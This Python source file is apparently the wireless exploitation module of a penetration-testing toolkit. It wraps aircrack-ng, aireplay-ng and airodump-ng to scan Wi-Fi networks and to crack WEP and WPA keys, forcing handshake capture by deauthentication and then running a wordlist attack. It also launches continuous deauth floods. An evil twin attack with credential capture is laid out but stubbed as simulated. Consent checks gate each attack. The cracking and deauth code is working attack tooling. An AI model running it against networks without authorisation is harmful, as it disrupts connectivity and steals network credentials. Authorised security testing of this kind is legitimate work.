"""
Pentest-USB Toolkit - Wireless Exploitation Module
=================================================

Wireless network exploitation using Aircrack-ng, Wifite, and other tools.
WPA/WEP cracking, evil twin attacks, and deauth attacks.

Author: Pentest-USB Development Team
Version: 1.0.0
"""

import re
import time
import json
import subprocess
import threading
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
import struct
import hashlib

from ...core.utils.logging_handler import get_logger
from ...core.utils.error_handler import PentestError
from ...core.security.consent_manager import ConsentManager
from ...core.utils.file_ops import FileOperations


class WirelessExploitationEngine:
    """
    Wireless network exploitation engine with multiple attack vectors
    """
    
    def __init__(self):
        """Initialize Wireless Exploitation Engine"""
        self.logger = get_logger(__name__)
        self.consent_manager = ConsentManager()
        self.file_ops = FileOperations()
        
        # Tool paths
        self.aircrack_path = self._find_tool_path('aircrack-ng')
        self.aireplay_path = self._find_tool_path('aireplay-ng')
        self.airodump_path = self._find_tool_path('airodump-ng')
        self.airmon_path = self._find_tool_path('airmon-ng')
        self.wifite_path = self._find_tool_path('wifite')
        self.hostapd_path = self._find_tool_path('hostapd')
        self.dnsmasq_path = self._find_tool_path('dnsmasq')
        
        # Working directories
        self.captures_dir = Path("/app/outputs/wireless/captures")
        self.cracking_dir = Path("/app/outputs/wireless/cracking")
        self.evil_twin_dir = Path("/app/outputs/wireless/evil_twin")
        
        self.file_ops.ensure_directory(self.captures_dir)
        self.file_ops.ensure_directory(self.cracking_dir)
        self.file_ops.ensure_directory(self.evil_twin_dir)
        
        # Wordlist paths
        self.wordlists = self._load_wordlists()
        
        # Network interface management
        self.monitor_interfaces = []
        self.original_interfaces = []
        
        self.logger.info("WirelessExploitationEngine initialized")
    
    def _find_tool_path(self, tool_name: str) -> Optional[str]:
        """Find tool path in binaries directory"""
        try:
            import platform
            system = platform.system().lower()
            
            tool_dir = Path(f"/app/tools/binaries/{system}")
            if system == "windows":
                tool_path = tool_dir / f"{tool_name}.exe"
            else:
                tool_path = tool_dir / tool_name
            
            if tool_path.exists():
                return str(tool_path)
            
            # Fallback to system PATH
            try:
                result = subprocess.run(['which', tool_name], capture_output=True, text=True)
                if result.returncode == 0:
                    return result.stdout.strip()
            except:
                pass
                
            self.logger.warning(f"Tool not found: {tool_name}")
            return None
            
        except Exception as e:
            self.logger.error(f"Error finding tool {tool_name}: {str(e)}")
            return None
    
    def _load_wordlists(self) -> Dict[str, str]:
        """Load available wordlists for password cracking"""
        wordlists = {}
        
        wordlist_dir = Path("/app/data/wordlists/passwords")
        if wordlist_dir.exists():
            for wordlist_file in wordlist_dir.glob("*.txt"):
                wordlists[wordlist_file.stem] = str(wordlist_file)
        
        # Common wordlist locations
        common_wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/john/password.lst",
            "/opt/wordlists/common-passwords.txt"
        ]
        
        for wordlist_path in common_wordlists:
            if Path(wordlist_path).exists():
                name = Path(wordlist_path).stem
                wordlists[name] = wordlist_path
        
        return wordlists
    
    def scan_wireless_networks(self, interface: str = None, duration: int = 30) -> Dict[str, Any]:
        """
        Scan for wireless networks
        
        Args:
            interface: Wireless interface to use (auto-detect if None)
            duration: Scan duration in seconds
            
        Returns:
            Discovered wireless networks
        """
        try:
            self.logger.info("Starting wireless network scan")
            
            # Check consent for wireless scanning
            if not self.consent_manager.verify_consent("wireless_scanning"):
                raise PentestError("Consent verification failed for wireless scanning")
            
            # Set up monitor mode
            monitor_interface = self._setup_monitor_mode(interface)
            if not monitor_interface:
                raise PentestError("Failed to set up monitor mode")
            
            # Run network scan
            networks = self._scan_networks(monitor_interface, duration)
            
            # Clean up monitor mode
            self._cleanup_monitor_mode(monitor_interface)
            
            scan_result = {
                'success': True,
                'interface_used': monitor_interface,
                'scan_duration': duration,
                'networks_found': len(networks),
                'networks': networks,
                'scan_summary': self._generate_scan_summary(networks)
            }
            
            self.logger.info(f"Wireless scan completed, found {len(networks)} networks")
            return scan_result
            
        except Exception as e:
            self.logger.error(f"Wireless scanning failed: {str(e)}")
            raise PentestError(f"Wireless scanning failed: {str(e)}")
    
    def crack_wep_network(self, target_network: Dict[str, Any], interface: str = None) -> Dict[str, Any]:
        """
        Crack WEP encrypted network
        
        Args:
            target_network: Target network information
            interface: Wireless interface to use
            
        Returns:
            WEP cracking results
        """
        try:
            self.logger.info(f"Attempting WEP crack on {target_network.get('ssid', 'Unknown')}")
            
            # Check consent
            if not self.consent_manager.verify_consent("wireless_exploitation"):
                raise PentestError("Consent verification failed for WEP cracking")
            
            # Set up monitor mode
            monitor_interface = self._setup_monitor_mode(interface)
            if not monitor_interface:
                raise PentestError("Failed to set up monitor mode")
            
            try:
                # Capture WEP traffic
                capture_result = self._capture_wep_traffic(target_network, monitor_interface)
                
                if not capture_result.get('success', False):
                    return {
                        'success': False,
                        'error': 'Failed to capture sufficient WEP traffic',
                        'capture_result': capture_result
                    }
                
                # Crack WEP key
                crack_result = self._crack_wep_key(capture_result['capture_file'])
                
                wep_result = {
                    'success': crack_result.get('success', False),
                    'method': 'wep_cracking',
                    'target_ssid': target_network.get('ssid', 'Unknown'),
                    'target_bssid': target_network.get('bssid', 'Unknown'),
                    'capture_result': capture_result,
                    'crack_result': crack_result,
                    'key_found': crack_result.get('key', None) if crack_result.get('success') else None
                }
                
                if crack_result.get('success', False):
                    self.logger.info(f"WEP key cracked: {crack_result.get('key', 'Unknown')}")
                else:
                    self.logger.warning("WEP cracking failed")
                
                return wep_result
                
            finally:
                self._cleanup_monitor_mode(monitor_interface)
                
        except Exception as e:
            self.logger.error(f"WEP cracking failed: {str(e)}")
            return {'success': False, 'error': str(e), 'method': 'wep_cracking'}
    
    def crack_wpa_network(self, target_network: Dict[str, Any], interface: str = None, 
                         wordlist: str = 'rockyou') -> Dict[str, Any]:
        """
        Crack WPA/WPA2 encrypted network
        
        Args:
            target_network: Target network information
            interface: Wireless interface to use
            wordlist: Wordlist to use for cracking
            
        Returns:
            WPA cracking results
        """
        try:
            self.logger.info(f"Attempting WPA crack on {target_network.get('ssid', 'Unknown')}")
            
            # Check consent
            if not self.consent_manager.verify_consent("wireless_exploitation"):
                raise PentestError("Consent verification failed for WPA cracking")
            
            # Set up monitor mode
            monitor_interface = self._setup_monitor_mode(interface)
            if not monitor_interface:
                raise PentestError("Failed to set up monitor mode")
            
            try:
                # Capture WPA handshake
                handshake_result = self._capture_wpa_handshake(target_network, monitor_interface)
                
                if not handshake_result.get('success', False):
                    return {
                        'success': False,
                        'error': 'Failed to capture WPA handshake',
                        'handshake_result': handshake_result
                    }
                
                # Crack WPA key using wordlist
                crack_result = self._crack_wpa_key(handshake_result['capture_file'], 
                                                 target_network.get('ssid', ''), wordlist)
                
                wpa_result = {
                    'success': crack_result.get('success', False),
                    'method': 'wpa_dictionary_attack',
                    'target_ssid': target_network.get('ssid', 'Unknown'),
                    'target_bssid': target_network.get('bssid', 'Unknown'),
                    'wordlist_used': wordlist,
                    'handshake_result': handshake_result,
                    'crack_result': crack_result,
                    'password_found': crack_result.get('password', None) if crack_result.get('success') else None
                }
                
                if crack_result.get('success', False):
                    self.logger.info(f"WPA password cracked: {crack_result.get('password', 'Unknown')}")
                else:
                    self.logger.warning("WPA cracking failed")
                
                return wpa_result
                
            finally:
                self._cleanup_monitor_mode(monitor_interface)
                
        except Exception as e:
            self.logger.error(f"WPA cracking failed: {str(e)}")
            return {'success': False, 'error': str(e), 'method': 'wpa_cracking'}
    
    def launch_evil_twin_attack(self, target_network: Dict[str, Any], interface: str = None) -> Dict[str, Any]:
        """
        Launch evil twin access point attack
        
        Args:
            target_network: Target network to clone
            interface: Wireless interface to use
            
        Returns:
            Evil twin attack results
        """
        try:
            self.logger.info(f"Launching evil twin attack against {target_network.get('ssid', 'Unknown')}")
            
            # Check consent
            if not self.consent_manager.verify_consent("wireless_exploitation"):
                raise PentestError("Consent verification failed for evil twin attack")
            
            # Set up interfaces
            monitor_interface = self._setup_monitor_mode(interface)
            if not monitor_interface:
                raise PentestError("Failed to set up monitor mode")
            
            # Get a second interface for AP mode
            ap_interface = self._get_ap_interface(interface)
            if not ap_interface:
                raise PentestError("Need two wireless interfaces for evil twin attack")
            
            try:
                # Create evil twin configuration
                evil_twin_config = self._create_evil_twin_config(target_network, ap_interface)
                
                # Start deauth attack on original network
                deauth_process = self._start_deauth_attack(target_network, monitor_interface)
                
                # Start evil twin AP
                ap_result = self._start_evil_twin_ap(evil_twin_config)
                
                if not ap_result.get('success', False):
                    return {
                        'success': False,
                        'error': 'Failed to start evil twin access point',
                        'ap_result': ap_result
                    }
                
                # Start credential capture
                capture_process = self._start_credential_capture(evil_twin_config)
                
                # Monitor attack
                monitoring_result = self._monitor_evil_twin(evil_twin_config, duration=300)  # 5 minutes
                
                # Stop attack
                self._stop_evil_twin_attack(deauth_process, ap_result, capture_process)
                
                evil_twin_result = {
                    'success': True,
                    'method': 'evil_twin_attack',
                    'target_ssid': target_network.get('ssid', 'Unknown'),
                    'target_bssid': target_network.get('bssid', 'Unknown'),
                    'evil_twin_ssid': evil_twin_config['ssid'],
                    'evil_twin_bssid': evil_twin_config['bssid'],
                    'deauth_started': deauth_process is not None,
                    'ap_result': ap_result,
                    'monitoring_result': monitoring_result,
                    'credentials_captured': monitoring_result.get('credentials_captured', [])
                }
                
                self.logger.info("Evil twin attack completed")
                return evil_twin_result
                
            finally:
                self._cleanup_monitor_mode(monitor_interface)
                
        except Exception as e:
            self.logger.error(f"Evil twin attack failed: {str(e)}")
            return {'success': False, 'error': str(e), 'method': 'evil_twin_attack'}
    
    def launch_deauth_attack(self, target_network: Dict[str, Any], interface: str = None,
                           target_client: str = None, duration: int = 60) -> Dict[str, Any]:
        """
        Launch deauthentication attack
        
        Args:
            target_network: Target network information
            interface: Wireless interface to use
            target_client: Specific client to deauth (None for broadcast)
            duration: Attack duration in seconds
            
        Returns:
            Deauth attack results
        """
        try:
            self.logger.info(f"Launching deauth attack on {target_network.get('ssid', 'Unknown')}")
            
            # Check consent
            if not self.consent_manager.verify_consent("wireless_exploitation"):
                raise PentestError("Consent verification failed for deauth attack")
            
            # Set up monitor mode
            monitor_interface = self._setup_monitor_mode(interface)
            if not monitor_interface:
                raise PentestError("Failed to set up monitor mode")
            
            try:
                # Execute deauth attack
                deauth_result = self._execute_deauth_attack(target_network, monitor_interface, 
                                                         target_client, duration)
                
                attack_result = {
                    'success': deauth_result.get('success', False),
                    'method': 'deauth_attack',
                    'target_ssid': target_network.get('ssid', 'Unknown'),
                    'target_bssid': target_network.get('bssid', 'Unknown'),
                    'target_client': target_client or 'broadcast',
                    'duration': duration,
                    'packets_sent': deauth_result.get('packets_sent', 0),
                    'deauth_result': deauth_result
                }
                
                if deauth_result.get('success', False):
                    self.logger.info("Deauth attack completed successfully")
                else:
                    self.logger.warning("Deauth attack failed or incomplete")
                
                return attack_result
                
            finally:
                self._cleanup_monitor_mode(monitor_interface)
                
        except Exception as e:
            self.logger.error(f"Deauth attack failed: {str(e)}")
            return {'success': False, 'error': str(e), 'method': 'deauth_attack'}
    
    def _setup_monitor_mode(self, interface: str = None) -> Optional[str]:
        """Set up monitor mode on wireless interface"""
        try:
            if not self.airmon_path:
                self.logger.error("airmon-ng not available")
                return None
            
            # Auto-detect interface if not specified
            if not interface:
                interface = self._detect_wireless_interface()
                if not interface:
                    return None
            
            # Start monitor mode
            monitor_interface = f"{interface}mon"
            
            cmd = [self.airmon_path, 'start', interface]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.monitor_interfaces.append(monitor_interface)
                self.original_interfaces.append(interface)
                self.logger.info(f"Monitor mode enabled on {monitor_interface}")
                return monitor_interface
            else:
                self.logger.error(f"Failed to enable monitor mode: {result.stderr}")
                return None
                
        except Exception as e:
            self.logger.error(f"Monitor mode setup failed: {str(e)}")
            return None
    
    def _cleanup_monitor_mode(self, monitor_interface: str):
        """Clean up monitor mode interface"""
        try:
            if not self.airmon_path or monitor_interface not in self.monitor_interfaces:
                return
            
            # Stop monitor mode
            cmd = [self.airmon_path, 'stop', monitor_interface]
            subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if monitor_interface in self.monitor_interfaces:
                self.monitor_interfaces.remove(monitor_interface)
            
            self.logger.info(f"Monitor mode disabled on {monitor_interface}")
            
        except Exception as e:
            self.logger.error(f"Monitor mode cleanup failed: {str(e)}")
    
    def _detect_wireless_interface(self) -> Optional[str]:
        """Auto-detect wireless interface"""
        try:
            # Use airmon-ng to detect wireless interfaces
            if self.airmon_path:
                result = subprocess.run([self.airmon_path], capture_output=True, text=True)
                
                # Parse output to find wireless interfaces
                for line in result.stdout.split('\n'):
                    if 'wlan' in line.lower() or 'wlp' in line.lower():
                        parts = line.split()
                        if parts and (parts[0].startswith('wlan') or parts[0].startswith('wlp')):
                            return parts[0]
            
            # Fallback to common interface names
            common_interfaces = ['wlan0', 'wlp2s0', 'wlp3s0', 'wlo1']
            for iface in common_interfaces:
                try:
                    result = subprocess.run(['ip', 'link', 'show', iface], 
                                          capture_output=True, text=True)
                    if result.returncode == 0:
                        return iface
                except:
                    continue
            
            return None
            
        except Exception as e:
            self.logger.error(f"Interface detection failed: {str(e)}")
            return None
    
    def _scan_networks(self, monitor_interface: str, duration: int) -> List[Dict[str, Any]]:
        """Scan for wireless networks using airodump-ng"""
        try:
            if not self.airodump_path:
                return []
            
            # Create capture file
            capture_prefix = self.captures_dir / f"scan_{int(time.time())}"
            
            # Run airodump-ng
            cmd = [
                self.airodump_path,
                monitor_interface,
                '--write', str(capture_prefix),
                '--output-format', 'csv'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Let it run for specified duration
            time.sleep(duration)
            
            # Terminate airodump
            process.terminate()
            process.wait(timeout=5)
            
            # Parse results
            csv_file = f"{capture_prefix}-01.csv"
            if Path(csv_file).exists():
                networks = self._parse_airodump_csv(csv_file)
                return networks
            
            return []
            
        except Exception as e:
            self.logger.error(f"Network scanning failed: {str(e)}")
            return []
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict[str, Any]]:
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find the start of network data
            network_start = -1
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'ESSID' in line:
                    network_start = i + 1
                    break
                elif line.strip() == '':
                    break
            
            if network_start == -1:
                return networks
            
            # Parse network entries
            for line in lines[network_start:]:
                line = line.strip()
                if not line or 'Station MAC' in line:
                    break
                
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    network = {
                        'bssid': parts[0],
                        'first_seen': parts[1],
                        'last_seen': parts[2],
                        'channel': parts[3],
                        'speed': parts[4],
                        'privacy': parts[5],
                        'cipher': parts[6],
                        'authentication': parts[7],
                        'power': parts[8],
                        'beacons': parts[9],
                        'iv': parts[10],
                        'lan_ip': parts[11],
                        'id_length': parts[12],
                        'ssid': parts[13] if len(parts) > 13 else '',
                        'encryption': self._determine_encryption(parts[5], parts[6], parts[7])
                    }
                    networks.append(network)
            
            return networks
            
        except Exception as e:
            self.logger.error(f"CSV parsing failed: {str(e)}")
            return []
    
    def _determine_encryption(self, privacy: str, cipher: str, auth: str) -> str:
        """Determine encryption type from airodump data"""
        if 'WPA2' in privacy:
            return 'WPA2'
        elif 'WPA' in privacy:
            return 'WPA'
        elif 'WEP' in privacy:
            return 'WEP'
        elif privacy.strip() == '' or 'OPN' in privacy:
            return 'Open'
        else:
            return 'Unknown'
    
    def _capture_wep_traffic(self, target_network: Dict[str, Any], monitor_interface: str) -> Dict[str, Any]:
        """Capture WEP traffic for cracking"""
        try:
            bssid = target_network.get('bssid', '')
            channel = target_network.get('channel', '1')
            
            # Set channel
            subprocess.run(['iwconfig', monitor_interface, 'channel', channel], 
                          capture_output=True, timeout=10)
            
            # Start packet capture
            capture_file = self.captures_dir / f"wep_capture_{int(time.time())}"
            
            cmd = [
                self.airodump_path,
                '--bssid', bssid,
                '--channel', channel,
                '--write', str(capture_file),
                monitor_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for sufficient data vectors (simplified)
            time.sleep(120)  # 2 minutes of capture
            
            process.terminate()
            process.wait(timeout=5)
            
            # Check if we have a capture file
            cap_file = f"{capture_file}-01.cap"
            if Path(cap_file).exists():
                return {
                    'success': True,
                    'capture_file': cap_file,
                    'method': 'passive_capture'
                }
            else:
                return {'success': False, 'error': 'No capture file created'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _crack_wep_key(self, capture_file: str) -> Dict[str, Any]:
        """Crack WEP key from capture file"""
        try:
            if not self.aircrack_path:
                return {'success': False, 'error': 'aircrack-ng not available'}
            
            cmd = [self.aircrack_path, capture_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse aircrack output for key
            if 'KEY FOUND!' in result.stdout:
                # Extract key from output
                key_match = re.search(r'KEY FOUND! \[ ([A-F0-9:]+) \]', result.stdout)
                if key_match:
                    key = key_match.group(1).replace(':', '')
                    return {
                        'success': True,
                        'key': key,
                        'key_format': 'hex',
                        'output': result.stdout
                    }
            
            return {
                'success': False,
                'error': 'Key not found',
                'output': result.stdout
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Cracking timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _capture_wpa_handshake(self, target_network: Dict[str, Any], monitor_interface: str) -> Dict[str, Any]:
        """Capture WPA handshake"""
        try:
            bssid = target_network.get('bssid', '')
            channel = target_network.get('channel', '1')
            
            # Set channel
            subprocess.run(['iwconfig', monitor_interface, 'channel', channel], 
                          capture_output=True, timeout=10)
            
            # Start handshake capture
            capture_file = self.captures_dir / f"wpa_handshake_{int(time.time())}"
            
            cmd = [
                self.airodump_path,
                '--bssid', bssid,
                '--channel', channel,
                '--write', str(capture_file),
                monitor_interface
            ]
            
            dump_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start deauth to force handshake
            time.sleep(5)  # Let airodump start
            
            deauth_cmd = [
                self.aireplay_path,
                '--deauth', '10',
                '-a', bssid,
                monitor_interface
            ]
            
            subprocess.run(deauth_cmd, capture_output=True, timeout=30)
            
            # Continue capture for handshake
            time.sleep(30)
            
            dump_process.terminate()
            dump_process.wait(timeout=5)
            
            # Check for handshake
            cap_file = f"{capture_file}-01.cap"
            if Path(cap_file).exists():
                # Verify handshake present
                if self._verify_handshake(cap_file, bssid):
                    return {
                        'success': True,
                        'capture_file': cap_file,
                        'method': 'deauth_induced'
                    }
            
            return {'success': False, 'error': 'Handshake not captured'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _verify_handshake(self, capture_file: str, bssid: str) -> bool:
        """Verify WPA handshake is present in capture"""
        try:
            if not self.aircrack_path:
                return False
            
            cmd = [self.aircrack_path, capture_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            # Check for handshake indicators
            return 'handshake' in result.stdout.lower() or '4-way' in result.stdout.lower()
            
        except:
            return False
    
    def _crack_wpa_key(self, capture_file: str, ssid: str, wordlist: str) -> Dict[str, Any]:
        """Crack WPA key using wordlist"""
        try:
            if not self.aircrack_path:
                return {'success': False, 'error': 'aircrack-ng not available'}
            
            # Get wordlist path
            wordlist_path = self.wordlists.get(wordlist)
            if not wordlist_path or not Path(wordlist_path).exists():
                return {'success': False, 'error': f'Wordlist not found: {wordlist}'}
            
            cmd = [
                self.aircrack_path,
                '-w', wordlist_path,
                '-e', ssid,
                capture_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)  # 30 min timeout
            
            # Parse result for password
            if 'KEY FOUND!' in result.stdout:
                # Extract password
                password_match = re.search(r'KEY FOUND! \[ (.+) \]', result.stdout)
                if password_match:
                    password = password_match.group(1).strip()
                    return {
                        'success': True,
                        'password': password,
                        'wordlist_used': wordlist,
                        'output': result.stdout
                    }
            
            return {
                'success': False,
                'error': 'Password not found in wordlist',
                'wordlist_used': wordlist,
                'output': result.stdout
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Cracking timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_ap_interface(self, exclude_interface: str = None) -> Optional[str]:
        """Get interface for access point mode"""
        # In a real implementation, this would detect available interfaces
        # For now, return None to indicate AP mode not available
        return None
    
    def _create_evil_twin_config(self, target_network: Dict[str, Any], ap_interface: str) -> Dict[str, Any]:
        """Create evil twin access point configuration"""
        config = {
            'ssid': target_network.get('ssid', 'Evil Twin'),
            'bssid': target_network.get('bssid', '00:00:00:00:00:00'),
            'channel': target_network.get('channel', '1'),
            'interface': ap_interface,
            'encryption': 'Open',  # Evil twin usually open for credential capture
            'config_file': self.evil_twin_dir / 'hostapd.conf',
            'dhcp_config': self.evil_twin_dir / 'dnsmasq.conf'
        }
        
        return config
    
    def _start_deauth_attack(self, target_network: Dict[str, Any], monitor_interface: str) -> Optional[subprocess.Popen]:
        """Start deauth attack process"""
        try:
            if not self.aireplay_path:
                return None
            
            bssid = target_network.get('bssid', '')
            
            cmd = [
                self.aireplay_path,
                '--deauth', '0',  # Continuous
                '-a', bssid,
                monitor_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return process
            
        except Exception as e:
            self.logger.error(f"Failed to start deauth attack: {str(e)}")
            return None
    
    def _start_evil_twin_ap(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Start evil twin access point"""
        # This would typically configure and start hostapd
        # For safety, we'll simulate the process
        return {
            'success': True,
            'note': 'Evil twin AP simulated for safety',
            'config': config
        }
    
    def _start_credential_capture(self, config: Dict[str, Any]) -> Optional[subprocess.Popen]:
        """Start credential capture process"""
        # This would start a captive portal or credential harvester
        # For safety, we'll simulate the process
        return None
    
    def _monitor_evil_twin(self, config: Dict[str, Any], duration: int = 300) -> Dict[str, Any]:
        """Monitor evil twin attack"""
        # Simulate monitoring
        time.sleep(min(duration, 10))  # Simulate brief monitoring
        
        return {
            'duration': duration,
            'clients_connected': 0,
            'credentials_captured': [],
            'note': 'Evil twin monitoring simulated'
        }
    
    def _stop_evil_twin_attack(self, deauth_process, ap_result, capture_process):
        """Stop all evil twin attack processes"""
        try:
            if deauth_process:
                deauth_process.terminate()
                deauth_process.wait(timeout=5)
            
            if capture_process:
                capture_process.terminate()
                capture_process.wait(timeout=5)
            
            # Stop AP (simulated)
            
        except Exception as e:
            self.logger.error(f"Failed to stop evil twin attack: {str(e)}")
    
    def _execute_deauth_attack(self, target_network: Dict[str, Any], monitor_interface: str,
                             target_client: str = None, duration: int = 60) -> Dict[str, Any]:
        """Execute deauth attack"""
        try:
            if not self.aireplay_path:
                return {'success': False, 'error': 'aireplay-ng not available'}
            
            bssid = target_network.get('bssid', '')
            
            cmd = [
                self.aireplay_path,
                '--deauth', str(duration),
                '-a', bssid
            ]
            
            if target_client:
                cmd.extend(['-c', target_client])
            
            cmd.append(monitor_interface)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 30)
            
            # Parse result for packet count
            packets_sent = 0
            for line in result.stdout.split('\n'):
                if 'deauthentication' in line.lower():
                    # Try to extract packet count
                    numbers = re.findall(r'\d+', line)
                    if numbers:
                        packets_sent = int(numbers[-1])
                        break
            
            return {
                'success': result.returncode == 0,
                'packets_sent': packets_sent,
                'output': result.stdout,
                'errors': result.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Deauth attack timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _generate_scan_summary(self, networks: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate scan summary statistics"""
        summary = {
            'total_networks': len(networks),
            'encryption_types': {},
            'channels_used': {},
            'strongest_signal': None,
            'open_networks': 0
        }
        
        for network in networks:
            # Count encryption types
            encryption = network.get('encryption', 'Unknown')
            summary['encryption_types'][encryption] = summary['encryption_types'].get(encryption, 0) + 1
            
            # Count channels
            channel = network.get('channel', 'Unknown')
            summary['channels_used'][channel] = summary['channels_used'].get(channel, 0) + 1
            
            # Find strongest signal
            try:
                power = int(network.get('power', -100))
                if summary['strongest_signal'] is None or power > summary['strongest_signal']['power']:
                    summary['strongest_signal'] = {
                        'ssid': network.get('ssid', 'Hidden'),
                        'bssid': network.get('bssid', 'Unknown'),
                        'power': power
                    }
            except:
                pass
            
            # Count open networks
            if encryption == 'Open':
                summary['open_networks'] += 1
        
        return summary


# Module-level functions for easy integration
def scan_wireless_networks(interface: str = None, duration: int = 30) -> Dict[str, Any]:
    """
    Scan for wireless networks
    
    Args:
        interface: Wireless interface to use
        duration: Scan duration in seconds
        
    Returns:
        Scan results
    """
    engine = WirelessExploitationEngine()
    return engine.scan_wireless_networks(interface, duration)


def crack_wpa_network(target_network: Dict[str, Any], interface: str = None, wordlist: str = 'rockyou') -> Dict[str, Any]:
    """
    Crack WPA network password
    
    Args:
        target_network: Target network information
        interface: Wireless interface to use
        wordlist: Wordlist for cracking
        
    Returns:
        Cracking results
    """
    engine = WirelessExploitationEngine()
    return engine.crack_wpa_network(target_network, interface, wordlist)


def launch_deauth_attack(target_network: Dict[str, Any], interface: str = None, 
                        target_client: str = None, duration: int = 60) -> Dict[str, Any]:
    """
    Launch deauthentication attack
    
    Args:
        target_network: Target network information
        interface: Wireless interface to use
        target_client: Specific client to target
        duration: Attack duration in seconds
        
    Returns:
        Attack results
    """
    engine = WirelessExploitationEngine()
    return engine.launch_deauth_attack(target_network, interface, target_client, duration)